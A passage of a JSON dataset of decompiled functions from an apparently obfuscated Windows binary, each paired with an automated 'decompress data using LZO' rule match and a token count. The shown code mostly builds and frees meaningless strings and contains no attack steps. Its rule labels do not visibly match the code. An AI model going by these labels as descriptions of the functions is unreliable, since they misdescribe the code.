(0xfff < in_stack_fffffef0) {\n                iVar2 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar2) goto code_r0x0044764d;\n                in_stack_fffffef0 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar2);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 0x10;\n        fcn.00402f72(0x22, in_stack_fffffef0 & 0xffffff00 | uStack84 & 0xff, \"xzzuajsxifouxiwaiyhfoefszeqjjsostz\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 0x11;\n        fcn.00402f72(0x22, uStack36, \"xzzuajsxifouxiwaiyhfoefszeqjjsostz\");\n        if (0xf < uStack64) {\n            uVar1 = uStack84;\n            if ((0xfff < uStack64 + 1) && (uVar1 = *(uStack84 - 4),  0x1f < (uStack84 - 4) - uVar1))\n            goto code_r0x00447659;\n            fcn.00401a32(uVar1);\n        }\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x00447665;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack88) {\n            iVar2 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar2 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar2))\n            goto code_r0x00447671;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack112) {\n            iVar2 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar2 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar2))\n            goto code_r0x0044767d;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack136) {\n            iVar2 = iStack156;\n            if ((0xfff < uStack136 + 1) && (iVar2 = *(iStack156 + -4),  0x1f < (iStack156 + -4) - iVar2))\n            goto code_r0x00447689;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_0000001c) {\n            iVar2 = param_2;\n            if ((0xfff < in_stack_0000001c + 1) && (iVar2 = *(param_2 + -4),  0x1f < (param_2 + -4) - iVar2))\n            goto code_r0x00447695;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000034) {\n            iVar2 = in_stack_00000020;\n            if ((0xfff < in_stack_00000034 + 1) &&\n               (iVar2 = *(in_stack_00000020 + -4),  0x1f < (in_stack_00000020 + -4) - iVar2)) goto code_r0x004476a1;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return;\n    }\n    in_stack_ffffff20 = uStack64 + 1;\n    uVar1 = uStack84;\n    if (in_stack_ffffff20 < 0x1000) {\ncode_r0x00447192:\n        fcn.00401a32(uVar1);\n        goto code_r0x0044719e;\n    }\n    uVar1 = *(uStack84 - 4);\n    if ((uStack84 - 4) - uVar1 < 0x20) {\n        in_stack_ffffff20 = uStack64 + 0x24;\n        goto code_r0x00447192;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0044761d:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00447629:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00447635:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x00447641:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x0044764d:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x00447659:\n    uStack20 = 6;\n    fcn.004047f5();\ncode_r0x00447665:\n    uStack20 = 7;\n    fcn.004047f5();\ncode_r0x00447671:\n    uStack20 = 8;\n    fcn.004047f5();\ncode_r0x0044767d:\n    uStack20 = 9;\n    fcn.004047f5();\ncode_r0x00447689:\n    uStack20 = 10;\n    fcn.004047f5();\ncode_r0x00447695:\n    uStack20 = 0xb;\n    fcn.004047f5();\ncode_r0x004476a1:\n    uStack20 = 0xc;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    return;\n}\n",
        "token_count": 3066
    },
    "00402e55": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00402e55(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint auStack168 [2];\n    char *pcStack160;\n    uint uStack156;\n    uint uStack140;\n    uint uStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack168;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c9b0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    pcStack160 = \"svlrxdyzlmvpcttrhgmlyoofcvnwmzo\";\n    auStack168[0] = 0x1f;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 4;\n    fcn.00402f72(0x4f, uStack156, \"jafkfcxutaptkdndzxcabmzybdqpeyxrcgxbolupnobldbtyjjqedzlqybbdwybaommzboqyakputjk\");\n    uStack136 = 0xf;\n    uStack140 = 3;\n    uStack156 = 0x756f69;\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 5;\n    fcn.00402f72(0x4f, iStack84, \"jafkfcxutaptkdndzxcabmzybdqpeyxrcgxbolupnobldbtyjjqedzlqybbdwybaommzboqyakputjk\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 6;\n    fcn.00402f72(0x4f, uStack36, \"jafkfcxutaptkdndzxcabmzybdqpeyxrcgxbolupnobldbtyjjqedzlqybbdwybaommzboqyakputjk\");\n    if (uStack64 < 0x10) {\ncode_r0x0043c588:\n        if (0xf < uStack88) {\n            iVar2 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar2 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar2))\n            goto code_r0x0043c655;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x0043c661;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack112) {\n            iVar2 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar2 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar2))\n            goto code_r0x0043c66d;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0xc4aa;\n    }\n    iVar2 = iStack84;\n    if ((uStack64 + 1 < 0x1000) || (iVar2 = *(iStack84 + -4),  (iStack84 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x0043c588;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0043c655:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0043c661:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0043c66d:\n    uStack20 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 1167
    },
    "00402ef5": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00402ef5(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_ffffff50;\n    uint32_t in_stack_ffffff68;\n    uint auStack120 [2];\n    char *pcStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack120;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c6f0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    pcStack112 = \"qfrhlrhzbcmqnflxwxilvwggdvqjeqnslsgbsrim\";\n    auStack120[0] = 0x28;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 7;\n    fcn.00402f72(0x28, uStack84, \"qfrhlrhzbcmqnflxwxilvwggdvqjeqnslsgbsrim\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = 0;\n    uStack20 = 10;\n    fcn.00402f72(0x28, uStack36, \"qfrhlrhzbcmqnflxwxilvwggdvqjeqnslsgbsrim\");\n    if (uStack64 < 0x10) {\ncode_r0x004348c3:\n        if (0xf < uStack40) {\n            in_stack_ffffff68 = uStack40 + 1;\n            iVar2 = iStack60;\n            if (0xfff < in_stack_ffffff68) {\n                iVar2 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar2) goto code_r0x00434b3e;\n                in_stack_ffffff68 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar2);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 7;\n        fcn.00402f72(0x28, in_stack_ffffff68 & 0xffffff00 | uStack84 & 0xff, \"qfrhlrhzbcmqnflxwxilvwggdvqjeqnslsgbsrim\")\n        ;\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 9;\n        fcn.00402f72(0x28, uStack36, \"qfrhlrhzbcmqnflxwxilvwggdvqjeqnslsgbsrim\");\n        if (0xf < uStack64) {\n            in_stack_ffffff50 = uStack64 + 1;\n            uVar1 = uStack84;\n            if (0xfff < in_stack_ffffff50) {\n                uVar1 = *(uStack84 - 4);\n                if (0x1f < (uStack84 - 4) - uVar1) goto code_r0x00434b4a;\n                in_stack_ffffff50 = uStack64 + 0x24;\n            }\n            fcn.00401a32(uVar1);\n        }\n        if (0xf < uStack40) {\n            in_stack_ffffff50 = uStack40 + 1;\n            iVar2 = iStack60;\n            if (0xfff < in_stack_ffffff50) {\n                iVar2 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar2) goto code_r0x00434b56;\n                in_stack_ffffff50 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar2);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 7;\n        fcn.00402f72(0x28, in_stack_ffffff50 & 0xffffff00 | uStack84 & 0xff, \"qfrhlrhzbcmqnflxwxilvwggdvqjeqnslsgbsrim\")\n        ;\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 8;\n        fcn.00402f72(0x28, uStack36, \"qfrhlrhzbcmqnflxwxilvwggdvqjeqnslsgbsrim\");\n        if (0xf < uStack64) {\n            uVar1 = uStack84;\n            if ((0xfff < uStack64 + 1) && (uVar1 = *(uStack84 - 4),  0x1f < (uStack84 - 4) - uVar1))\n            goto code_r0x00434b62;\n            fcn.00401a32(uVar1);\n        }\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x00434b6e;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack88) {\n            iVar2 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar2 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar2))\n            goto code_r0x00434b7a;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return;\n    }\n    in_stack_ffffff68 = uStack64 + 1;\n    uVar1 = uStack84;\n    if (in_stack_ffffff68 < 0x1000) {\ncode_r0x004348b7:\n        fcn.00401a32(uVar1);\n        goto code_r0x004348c3;\n    }\n    uVar1 = *(uStack84 - 4);\n    if ((uStack84 - 4) - uVar1 < 0x20) {\n        in_stack_ffffff68 = uStack64 + 0x24;\n        goto code_r0x004348b7;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00434b3e:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00434b4a:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00434b56:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x00434b62:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x00434b6e:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x00434b7a:\n    uStack20 = 6;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    return;\n}\n",
        "token_count": 1845
    },
    "00402f36": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00402f36(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint auStack168 [2];\n    char *pcStack160;\n    int32_t iStack156;\n    uint uStack140;\n    uint32_t uStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack168;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x414990;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack140 = 0;\n    uStack136 = 0xf;\n    iStack156 = 0;\n    pcStack160 = \"nzfdknvqxopqtqhxnlmxcrzdkeenurngvscnwftypfsjzklljmnaelgnq\";\n    auStack168[0] = 0x39;\n    fcn.00402f72();\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 5;\n    fcn.00402f72(99, iStack84, \n                 \"fmlqggufxtgojrssbaurjbtzrizlchkgpvufovcnldlozhnvfhfalzuymulxoopwrmoehwbixahxmjeudsefnksuqseblqjpawz\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 6;\n    fcn.00402f72(0x44, iStack60, \"jiompwoqlahoirwievhntaxmksnupoxiinskkxitbaajmabmlovrzofncwamawityfov\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 7;\n    fcn.00402f72(99, iStack132, \n                 \"fmlqggufxtgojrssbaurjbtzrizlchkgpvufovcnldlozhnvfhfalzuymulxoopwrmoehwbixahxmjeudsefnksuqseblqjpawz\");\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    uStack20 = 8;\n    fcn.00402f72(99, uStack36, \n                 \"fmlqggufxtgojrssbaurjbtzrizlchkgpvufovcnldlozhnvfhfalzuymulxoopwrmoehwbixahxmjeudsefnksuqseblqjpawz\");\n    if (uStack112 < 0x10) {\ncode_r0x00411a67:\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x00411b78;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack64) {\n            iVar2 = iStack84;\n            if ((0xfff < uStack64 + 1) && (iVar2 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar2))\n            goto code_r0x00411b84;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack88) {\n            iVar2 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar2 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar2))\n            goto code_r0x00411b90;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack136) {\n            iVar2 = iStack156;\n            if ((0xfff < uStack136 + 1) && (iVar2 = *(iStack156 + -4),  0x1f < (iStack156 + -4) - iVar2))\n            goto code_r0x00411b9c;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0x411;\n    }\n    iVar2 = iStack132;\n    if ((uStack112 + 1 < 0x1000) || (iVar2 = *(iStack132 + -4),  (iStack132 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x00411a67;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00411b78:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00411b84:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00411b90:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x00411b9c:\n    uStack20 = 4;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 1380
    },
    "00402f4a": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.00402f4a(uint *param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint auStack120 [2];\n    char *pcStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack120;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44cb50;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    pcStack112 = \"oqshprxjervbcqtkhvqtbvrwbainu\";\n    auStack120[0] = 0x1d;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 3;\n    fcn.00402f72(0x1d, iStack84, \"oqshprxjervbcqtkhvqtbvrwbainu\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 4;\n    fcn.00402f72(0x1d, uStack36, \"oqshprxjervbcqtkhvqtbvrwbainu\");\n    if (uStack64 < 0x10) {\ncode_r0x004415d3:\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x00441694;\n            fcn.00401a32(iVar2);\n        }\n        param_1[5] = 0xf;\n        param_1[4] = 0xf;\n        *param_1 = 0x75666878;\n        param_1[1] = 0x7877616e;\n        param_1[2] = 0x7a766b65;\n        *(param_1 + 0xb) = 0x7563707a;\n        *(param_1 + 0xf) = 0;\n        if (0xf < uStack88) {\n            iVar2 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar2 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar2))\n            goto code_r0x004416a0;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return param_1;\n    }\n    iVar2 = iStack84;\n    if ((uStack64 + 1 < 0x1000) || (iVar2 = *(iStack84 + -4),  (iStack84 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x004415d3;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00441694:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x004416a0:\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    puVar1 = fcn.00403a76();\n    return puVar1;\n}\n",
        "token_count": 946
    },
    "00402f72": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint32_t * __thiscall fcn.00402f72(uint32_t *param_1, uint32_t param_2, uint param_3, uint param_4)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t arg_8h;\n    uint32_t *puVar4;\n    uint32_t uVar5;\n    int32_t **in_FS_OFFSET;\n    uint32_t arg_8h_00;\n    uint32_t uStack36;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    uStack20 = 0xffffffff;\n    uStack24 = 0x41e280;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    if (param_2 < 0) {\n        fcn.004038aa();\n    }\n    else {\n        arg_8h_00 = param_1[5];\n        uVar5 = param_2 | 0xf;\n        uVar2 = 0x80000000;\n        uStack36 = 0x7fffffff;\n        if ((uVar5 < 0) || ((arg_8h_00 >> 1 ^ 0x7fffffff) < arg_8h_00)) {\ncode_r0x00417e04:\n            iVar3 = fcn.004024b9(uVar2 + 0x23, arg_8h_00);\n            uVar2 = iVar3 + 0x23U & 0xffffffe0;\n            *(uVar2 - 4) = iVar3;\n        }\n        else {\n            uStack36 = (arg_8h_00 >> 1) + arg_8h_00;\n            if (uStack36 <= uVar5) {\n                uStack36 = uVar5;\n            }\n            uVar2 = uStack36 + 1;\n            if (0xfff < uVar2) {\n                if (0xffffffdc < uVar2) goto code_r0x00417e9f;\n                goto code_r0x00417e04;\n            }\n            uVar2 = fcn.004024b9(uVar2, arg_8h_00);\n        }\n        param_1[4] = param_2;\n        param_1[5] = uStack36;\n        fcn.0040576d(uVar2, param_4, param_2);\n        *(uVar2 + param_2) = 0;\n        if (arg_8h_00 < 0x10) {\ncode_r0x00417e6a:\n            *param_1 = uVar2;\n            *in_FS_OFFSET = piStack28;\n            return param_1;\n        }\n        uVar5 = *param_1;\n        arg_8h = uVar5;\n        if ((arg_8h_00 + 1 < 0x1000) || (arg_8h = *(uVar5 - 4),  (uVar5 - 4) - arg_8h < 0x20)) {\n            fcn.00401a32(arg_8h);\n            goto code_r0x00417e6a;\n        }\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00417e9f:\n    fcn.004050bf();\n    fcn.004052d1();\n    pcVar1 = swi(3);\n    puVar4 = (*pcVar1)();\n    return puVar4;\n}\n",
        "token_count": 783
    },
    "00402f8b": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint fcn.00402f8b(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000018;\n    int32_t in_stack_0000001c;\n    uint32_t in_stack_00000030;\n    int32_t in_stack_0000003c;\n    uint32_t in_stack_00000050;\n    int32_t in_stack_00000054;\n    uint32_t in_stack_00000068;\n    int32_t aiStack60 [4];\n    uint uStack44;\n    uint32_t uStack40;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack60;\n    uStack24 = 0x44c780;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    aiStack60[0] = 0;\n    uStack20 = 5;\n    fcn.00402f72(0x5b);\n    if (uStack40 < 0x10) {\ncode_r0x00435cb9:\n        if (0xf < in_stack_00000018) {\n            iVar2 = param_1;\n            if ((0xfff < in_stack_00000018 + 1) && (iVar2 = *(param_1 + -4),  0x1f < (param_1 + -4) - iVar2))\n            goto code_r0x00435df0;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000030) {\n            iVar2 = in_stack_0000001c;\n            if ((0xfff < in_stack_00000030 + 1) &&\n               (iVar2 = *(in_stack_0000001c + -4),  0x1f < (in_stack_0000001c + -4) - iVar2)) goto code_r0x00435dfc;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000050) {\n            iVar2 = in_stack_0000003c;\n            if ((0xfff < in_stack_00000050 + 1) &&\n               (iVar2 = *(in_stack_0000003c + -4),  0x1f < (in_stack_0000003c + -4) - iVar2)) goto code_r0x00435e08;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000068) {\n            iVar2 = in_stack_00000054;\n            if ((0xfff < in_stack_00000068 + 1) &&\n               (iVar2 = *(in_stack_00000054 + -4),  0x1f < (in_stack_00000054 + -4) - iVar2)) goto code_r0x00435e14;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0;\n    }\n    iVar2 = aiStack60[0];\n    if ((uStack40 + 1 < 0x1000) || (iVar2 = *(aiStack60[0] + -4),  (aiStack60[0] + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x00435cb9;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00435df0:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00435dfc:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00435e08:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x00435e14:\n    uStack20 = 4;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    fcn.00403a76();\n    fcn.00403a76();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 1020
    },
    "00403049": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid fcn.00403049(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000018;\n    int32_t in_stack_0000001c;\n    uint32_t in_stack_00000030;\n    int32_t in_stack_00000040;\n    uint32_t in_stack_00000054;\n    int32_t in_stack_00000060;\n    uint32_t in_stack_00000074;\n    int32_t aiStack60 [4];\n    uint uStack44;\n    uint32_t uStack40;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack60;\n    uStack24 = 0x44c510;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    aiStack60[0] = 0;\n    uStack20 = 5;\n    fcn.00402f72(0x11);\n    if (uStack40 < 0x10) {\ncode_r0x0042f3a9:\n        if (0xf < in_stack_00000018) {\n            iVar1 = param_1;\n            if ((0xfff < in_stack_00000018 + 1) && (iVar1 = *(param_1 + -4),  0x1f < (param_1 + -4) - iVar1))\n            goto code_r0x0042f4de;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000030) {\n            iVar1 = in_stack_0000001c;\n            if ((0xfff < in_stack_00000030 + 1) &&\n               (iVar1 = *(in_stack_0000001c + -4),  0x1f < (in_stack_0000001c + -4) - iVar1)) goto code_r0x0042f4ea;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000054) {\n            iVar1 = in_stack_00000040;\n            if ((0xfff < in_stack_00000054 + 1) &&\n               (iVar1 = *(in_stack_00000040 + -4),  0x1f < (in_stack_00000040 + -4) - iVar1)) goto code_r0x0042f4f6;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000074) {\n            iVar1 = in_stack_00000060;\n            if ((0xfff < in_stack_00000074 + 1) &&\n               (iVar1 = *(in_stack_00000060 + -4),  0x1f < (in_stack_00000060 + -4) - iVar1)) goto code_r0x0042f502;\n            fcn.00401a32(iVar1);\n        }\n        *in_FS_OFFSET = piStack28;\n        return;\n    }\n    iVar1 = aiStack60[0];\n    if ((uStack40 + 1 < 0x1000) || (iVar1 = *(aiStack60[0] + -4),  (aiStack60[0] + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x0042f3a9;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0042f4de:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0042f4ea:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0042f4f6:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x0042f502:\n    uStack20 = 4;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    